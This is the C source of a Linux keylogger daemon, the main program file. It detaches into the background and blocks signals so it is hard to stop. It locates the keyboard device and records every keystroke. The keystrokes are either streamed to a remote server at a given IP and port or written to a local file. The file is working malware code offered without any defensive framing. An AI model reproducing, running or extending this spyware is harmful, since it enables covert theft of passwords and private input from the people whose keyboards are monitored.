/**Developed by Fabio Cinicolo **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <syslog.h>
#include <stdio.h>
#include <signal.h>
#include <fcntl.h>
#include "daemon.h"
#include "keylogger.h"

#define SYSLOG_PROC_NAME "Keylogger-daemon"
#define SOCKET 1
#define FILE 2

int blockAllSignals();
int unblockSignal(int signum);

int main(int argc, char *argv[])
{
    int fd, keyboard, flock, file_out_type;
    int is_single_instance;

    if (argc != 4 && argc != 3)
        fprintf(stderr, "Usage: ./keylogger-daemon ip port [0|1] OR ./keylogger-daemon filename [0|1]\n"), exit(EXIT_FAILURE);

    if (!daemonize()) /* Convert process to daemon */
        fprintf(stderr, "Couldn't daemonize process\n"), exit(EXIT_FAILURE);

    openlog(SYSLOG_PROC_NAME, LOG_PID, LOG_USER); /* Pid and name will appear in the syslog */
    
    syslog(LOG_INFO, "Process successfully daemonized");

    is_single_instance = argc == 4 ? atoi(argv[3]) : atoi(argv[2]);

    if (is_single_instance) /* If user choose single instance daemon.. */
    {
        int ret = daemonAlreadyRunning(&flock); /* ..we have to check if daemon is already running */
        if (ret == 1)
            syslog(LOG_ERR, "Another instance of the daemon is already running, quitting.."), exit(EXIT_FAILURE);
        else if (ret == 2)
            syslog(LOG_ERR, "No other instances of the daemon are running but something went wrong. [%s], quitting..", strerror(errno)), exit(EXIT_FAILURE);

        syslog(LOG_INFO, "Write lock successfully acquired, no other instances of this process can spawn");
    }

    if (!blockAllSignals()) /* Blocking all signals */
        syslog(LOG_ERR, "Couldn't set signal bitmask [%s], quitting..", strerror(errno)), exit(EXIT_FAILURE);

    if ((keyboard = findKeyboardDevice(PATH)) < 0) /* Looking for Keyboard device driver */
        syslog(LOG_ERR, "Couldn't find keyboard device"), exit(EXIT_FAILURE);

    syslog(LOG_INFO, "Keyboard device driver found");

    file_out_type = argc == 4 ? SOCKET : FILE;

    if (file_out_type == SOCKET) /* If user decided to send events to server */
    {
        char *ip = argv[1];
        short port = atoi(argv[2]);
        if (!(fd = openConnectionWithServer(ip, port))) /* Connecting with server */
            syslog(LOG_ERR, "Couldn't connect with server, check hostname or try again later [%s], quitting..", strerror(errno)), exit(EXIT_FAILURE);

        syslog(LOG_INFO, "Connection opened, IP: %s - PORT: %d", ip, port);

        if (!unblockSignal(SIGPIPE)) /* Unblocking SIGPIPE */
            syslog(LOG_ERR, "Couldn't unblock SIGPIPE [%s], quitting..", strerror(errno)), exit(EXIT_FAILURE);  
    }
    else if (file_out_type == FILE) /* If user decided to save events locally */
    {
        char *file_out_path = argv[1];
        if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR)) < 0)
            syslog(LOG_ERR, "Couldn't open file %s [%s], quitting..", argv[2], strerror(errno)), exit(EXIT_FAILURE);

        syslog(LOG_INFO, "%s opened", file_out_path);

        if (!unblockSignal(SIGTERM)) /* Unblocking SIGTERM */
            syslog(LOG_ERR, "Couldn't unblock SIGTERM [%s], quitting..", strerror(errno)), exit(EXIT_FAILURE);
    }


    syslog(LOG_INFO, "Keylogging...");

    startKeylogger(keyboard, fd); /* Reading from keyboard device and sending events to file */

    syslog(LOG_INFO, "**Daemon safely terminated**");
    close(flock); /* Closing daemon's lock file */
    exit(EXIT_SUCCESS);
}

int blockAllSignals()
{
    sigset_t signal_set;
    sigfillset(&signal_set);
    return sigprocmask(SIG_SETMASK, &signal_set, NULL) < 0 ? 0 : 1;
}

int unblockSignal(int signum)
{

    sigset_t signal_set;
    sigemptyset(&signal_set);
    sigaddset(&signal_set, signum);
    return sigprocmask(SIG_UNBLOCK, &signal_set, NULL) < 0 ? 0 : 1;
}
